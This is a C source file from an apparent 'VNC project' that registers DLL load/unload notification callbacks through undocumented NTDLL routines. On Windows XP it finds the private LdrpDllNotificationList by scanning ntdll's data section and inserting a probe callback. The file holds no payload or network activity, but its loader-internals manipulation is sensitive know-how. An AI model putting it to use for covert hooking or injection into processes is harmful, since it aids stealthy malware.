//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: dllntfy.h
// $Revision: 192 $
// $Date: 2014-07-11 16:53:02 +0400 (Пт, 11 июл 2014) $
// description:
//	Undocumented NT DLL-loader functions aka set/remove DLL-load/unload notification calback and so on.

#include "main.h"
#include "common.h"
#include "dllntfy.h"

PLIST_ENTRY	g_pLdrpDllNotificationList = NULL;

//
//	Sample DLL-load/unload notification callback, used to search for LdrpDllNotificationList
//
static VOID _stdcall my_LdrDllNotificationCallback(
	ULONG NotificationReason, 
	PVOID NotificationData, 
	PVOID Context
	)
{
	PBOOL pComplete = (PBOOL)Context;
	*pComplete = TRUE;
}


//
//	Scans NTDLL's .data section for LdrpDllNotificationList:
//	searches for an initialized LIST_ENTRY, adds our callbak to the list and attempts to load any DLL, if the callback is being executed - 
//	 this LIST_ENTRY is what we looking for.
//
static PLIST_ENTRY LookupLdrpDllNotificationList(VOID)
{
	HMODULE hModule, NtDllBase = GetModuleHandleW(wczNtdll);
	PVOID	DataSection = PeSupGetFirstWritableSection((PCHAR)NtDllBase);
	PLIST_ENTRY pList = NULL;

	if (DataSection)
	{
		PLIST_ENTRY	pEntry = (PLIST_ENTRY)((PCHAR)NtDllBase + PeSupGetSectionRva(DataSection));
		PVOID		pEnd = (PVOID)((PCHAR)pEntry + PeSupGetSectionVSize(DataSection) - sizeof(LIST_ENTRY));
		BOOL		Complete = FALSE;
		LDR_DLL_NOTIFICATION_DESCRIPTOR Ldrn = {0};

		Ldrn.NotificationRoutine = &my_LdrDllNotificationCallback;
		Ldrn.NotificationContext = &Complete;
		InitializeListHead(&Ldrn.Entry);

		while (!Complete && ((ULONG_PTR)pEntry <= (ULONG_PTR)pEnd))
		{
			// Checking if there's an empty initialized list
			if ((pEntry->Flink == pEntry) && (pEntry->Flink == pEntry->Blink))
			{
				InsertHeadList(pEntry, &Ldrn.Entry);

				// Loading a DLL that surely hasn't been loaded yet
				if (hModule = LoadLibrary(_T("ntdsapi.dll")))
					FreeLibrary(hModule);

				RemoveEntryList(&Ldrn.Entry);

				if (Complete)
					pList = pEntry;
			}	// if ((pEntry->Flink == pEntry) && (pEntry->Flink == pEntry->Blink))
			pEntry += 1;	
		}	// while (!Complete && ((ULONG_PTR)pEntry <= (ULONG_PTR)pEnd))
	}	// if (DataSection)

	return(pList);
}


//
//	Sets DLL-load/unload notification callback function.
//
WINERROR	SetDllNotificationCallback(
	LOAD_DLL_NOTIFICATION_CALLBACK	pCallback,				// caller-specified callback function
	PVOID							Context,				// caller-specified context value that will be passed to the callback function
	PVOID*							pNotificationDescriptor	// receives notification descriptor for the specified callback
	)
{
	WINERROR	Status = ERROR_INVALID_FUNCTION;

	if (LOBYTE(LOWORD(GetVersion())) >= 6)
	{
		// Setting for Windows Vista and higher

		TYPE_LdrRegisterDllNotification pLdrRegisterDllNotification;

		if (pLdrRegisterDllNotification = 
			(TYPE_LdrRegisterDllNotification)GetProcAddress(GetModuleHandleW(wczNtdll), "LdrRegisterDllNotification"))
		{
			if ((pLdrRegisterDllNotification)(0, pCallback, Context, pNotificationDescriptor) == STATUS_SUCCESS)
				Status = NO_ERROR;
		}
	}	// 	if (LOBYTE(LOWORD(g_SystemVersion >= 6)))
	else
	{
		// Setting for Windows XP

		if ((g_pLdrpDllNotificationList) || (g_pLdrpDllNotificationList = LookupLdrpDllNotificationList()))
		{
			PLDR_DLL_NOTIFICATION_DESCRIPTOR	pDescriptor;

			if (pDescriptor = AppAlloc(sizeof(LDR_DLL_NOTIFICATION_DESCRIPTOR)))
			{
				pDescriptor->NotificationRoutine = pCallback;
				pDescriptor->NotificationContext = Context;
				InitializeListHead(&pDescriptor->Entry);
	#if _DEBUG
				pDescriptor->Magic = LDR_DLL_NOTIFICATION_DESCRIPTOR_MAGIC;
	#endif
				*pNotificationDescriptor = pDescriptor;
				InsertTailList(g_pLdrpDllNotificationList, &pDescriptor->Entry);
				Status = NO_ERROR;
			}	// if (pDescriptor = AppAlloc(sizeof(LDR_DLL_NOTIFICATION_DESCRIPTOR)))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if ((g_pLdrpDllNotificationList) || (g_pLdrpDllNotificationList = LookupLdrpDllNotificationList()))
		else
			DbgPrint("LdrpDllNotificationList NOT found.\n");
	}

	return(Status);
}


//
//	Removes DLL-load/unload notification callback function.
//
WINERROR	RemoveDllNotificationCallback(
	PVOID	pNotificationDescriptor		// notification callback descriptor previously returned by SetDllNotificationCallback() function
	)
{
	WINERROR	Status = ERROR_INVALID_FUNCTION;

	if (LOBYTE(LOWORD(GetVersion())) >= 6)
	{
		// Removing for Windows Vista and higher

		TYPE_LdrUnregisterDllNotification pLdrUnregisterDllNotification;

		if (pLdrUnregisterDllNotification = 
			(TYPE_LdrUnregisterDllNotification)GetProcAddress(GetModuleHandleW(wczNtdll), "LdrUnregisterDllNotification"))
		{
			if ((pLdrUnregisterDllNotification)(pNotificationDescriptor) == STATUS_SUCCESS)
				Status = NO_ERROR;
		}
	}	// 	if (LOBYTE(LOWORD(g_WindowsVersion)) >= 6)
	else
	{
		// Removing for Windows XP
		
		PLDR_DLL_NOTIFICATION_DESCRIPTOR pDescriptor = (PLDR_DLL_NOTIFICATION_DESCRIPTOR)pNotificationDescriptor;

		ASSERT_DLL_NOTIFICATION_DESCRIPTOR(pDescriptor);

		if (g_pLdrpDllNotificationList)
		{
			ASSERT(!IsListEmpty(g_pLdrpDllNotificationList));
			ASSERT(!IsListEmpty(&pDescriptor->Entry));

			RemoveEntryList(&pDescriptor->Entry);
	#if _DEBUG
			pDescriptor->Magic = ~LDR_DLL_NOTIFICATION_DESCRIPTOR_MAGIC;
	#endif
			AppFree(pDescriptor);
			Status = NO_ERROR;
		}	// if (g_pLdrpDllNotificationList)
	}

	return(Status);
}